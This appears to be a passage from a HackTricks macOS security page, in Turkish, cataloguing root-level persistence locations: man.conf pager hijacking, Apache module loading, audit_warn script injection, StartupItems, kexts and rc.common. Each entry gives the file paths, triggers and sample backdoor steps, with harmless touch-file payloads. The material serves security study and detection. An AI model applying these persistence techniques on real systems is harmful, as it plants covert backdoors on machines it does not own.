**`evaluate-mechanisms`** yetkilendirme çerçevesine **bir dış yetkilendirme mekanizmasını çağırması gerektiğini** söyleyecektir. Ayrıca, **`privileged`** bunun root tarafından çalıştırılmasını sağlayacaktır.

Bunu tetiklemek için:
```bash
security authorize com.asdf.asdf
```
Ve ardından **staff grubunun sudo** erişimine sahip olması gerekir (doğrulamak için `/etc/sudoers` dosyasını okuyun).

### Man.conf

Yazı: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Sandbox'ı atlatmak için yararlıdır: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve kullanıcının man kullanması gerekir
- TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/private/etc/man.conf`**
- Root gereklidir
- **`/private/etc/man.conf`**: Man her kullanıldığında

#### Açıklama & Sömürü

Yapılandırma dosyası **`/private/etc/man.conf`**, man belgelerini açarken kullanılacak ikili/dosya yolunu belirtir. Bu nedenle, yürütülebilir dosyanın yolu değiştirilerek, kullanıcı man ile bazı belgeleri okuduğunda bir arka kapının çalıştırılması sağlanabilir.

Örneğin **`/private/etc/man.conf`** içinde ayarlayın:
```
MANPAGER /tmp/view
```
Ve ardından `/tmp/view` dosyasını oluşturun:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Sandbox'ı atlatmak için yararlıdır: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve apache'nin çalışıyor olması gerekir
- TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)
- Httpd'nin yetkileri yoktur

#### Location

- **`/etc/apache2/httpd.conf`**
- Root gerekli
- Tetikleyici: Apache2 başlatıldığında

#### Description & Exploit

`/etc/apache2/httpd.conf` dosyasında bir modül yüklemek için aşağıdaki gibi bir satır ekleyebilirsiniz:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Bu şekilde derlenmiş modülleriniz Apache tarafından yüklenecektir. Tek gereken, ya **geçerli bir Apple sertifikası ile imzalamanız** ya da sistemde **yeni bir güvenilir sertifika eklemeniz** ve bunu **imzalamanızdır**.

Sonra, gerekirse, sunucunun başlatılmasını sağlamak için şunu çalıştırabilirsiniz:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb için kod örneği:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM denetim çerçevesi

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Sandbox'ı atlatmak için yararlıdır: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız, auditd'nin çalışıyor olması ve bir uyarı oluşturması gerekir
- TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/etc/security/audit_warn`**
- Root gereklidir
- **Tetikleyici**: auditd bir uyarı tespit ettiğinde

#### Açıklama & Sömürü

auditd her uyarı tespit ettiğinde **`/etc/security/audit_warn`** betiği **çalıştırılır**. Bu nedenle, ona yüklemenizi ekleyebilirsiniz.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
`sudo audit -n` ile bir uyarı zorlayabilirsiniz.

### Başlangıç Öğeleri

> [!CAUTION] > **Bu artık kullanılmıyor, bu nedenle o dizinlerde hiçbir şey bulunmamalıdır.**

**StartupItem**, ya `/Library/StartupItems/` ya da `/System/Library/StartupItems/` içinde konumlandırılması gereken bir dizindir. Bu dizin oluşturulduğunda, iki belirli dosyayı içermelidir:

1. Bir **rc script**: Başlangıçta yürütülen bir shell script.
2. Özellikle `StartupParameters.plist` adı verilen bir **plist dosyası**, çeşitli yapılandırma ayarlarını içerir.

Başlangıç sürecinin bunları tanıyıp kullanabilmesi için hem rc script hem de `StartupParameters.plist` dosyasının **StartupItem** dizini içinde doğru bir şekilde yerleştirildiğinden emin olun.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Bu bileşeni macOS'ümde bulamıyorum, bu yüzden daha fazla bilgi için yazıya göz atın

Yazı: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Apple tarafından tanıtılan **emond**, gelişmemiş veya muhtemelen terkedilmiş gibi görünen bir günlükleme mekanizmasıdır, ancak yine de erişilebilir durumdadır. Bir Mac yöneticisi için özellikle faydalı olmasa da, bu belirsiz hizmet, tehdit aktörleri için ince bir kalıcılık yöntemi olarak hizmet edebilir ve muhtemelen çoğu macOS yöneticisi tarafından fark edilmez.

Var olduğunun farkında olanlar için, **emond**'un herhangi bir kötü niyetli kullanımını tespit etmek oldukça basittir. Bu hizmetin sisteminin LaunchDaemon'ı, tek bir dizinde çalıştırılacak betikler arar. Bunu incelemek için aşağıdaki komut kullanılabilir:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Konum

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root gereklidir
- **Tetikleyici**: XQuartz ile

#### Açıklama & Sömürü

XQuartz **artık macOS'ta yüklü değil**, bu yüzden daha fazla bilgi istiyorsanız yazıya bakın.

### ~~kext~~

> [!CAUTION]
> Kext'i root olarak bile yüklemek o kadar karmaşık ki, bunu sandbox'lardan kaçmak veya kalıcılık için düşünmeyeceğim (bir sömürüye sahip olmadığınız sürece)

#### Konum

Bir KEXT'i başlangıç öğesi olarak yüklemek için, **aşağıdaki konumlardan birine yüklenmesi gerekir**:

- `/System/Library/Extensions`
- OS X işletim sistemine entegre edilmiş KEXT dosyaları.
- `/Library/Extensions`
- 3. parti yazılımlar tarafından yüklenen KEXT dosyaları

Mevcut yüklü kext dosyalarını listelemek için:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Daha fazla bilgi için [**kernel uzantıları için bu bölüme bakın**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Yazı: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Konum

- **`/usr/local/bin/amstoold`**
- Root gerekli

#### Açıklama & Sömürü

Görünüşe göre `/System/Library/LaunchAgents/com.apple.amstoold.plist` dosyasındaki `plist`, bir XPC hizmeti sunarken bu ikiliyi kullanıyordu... sorun şu ki, ikili mevcut değildi, bu yüzden oraya bir şey yerleştirebilir ve XPC hizmeti çağrıldığında ikiliniz çağrılacaktır.

Artık bunu macOS'ümde bulamıyorum.

### ~~xsanctl~~

Yazı: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Konum

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root gerekli
- **Tetikleyici**: Hizmet çalıştırıldığında (nadiren)

#### Açıklama & sömürü

Görünüşe göre bu scripti çalıştırmak pek yaygın değil ve ben bile macOS'ümde bulamadım, bu yüzden daha fazla bilgi istiyorsanız yazıya bakın.

### ~~/etc/rc.common~~

> [!CAUTION] > **Bu modern MacOS sürümlerinde çalışmıyor**

Ayrıca burada **başlangıçta çalıştırılacak komutlar yerleştirmek mümkündür.** Örnek olarak normal rc.common scripti:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Süreklilik teknikleri ve araçları

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

{{#include ../banners/hacktricks-training.md}}
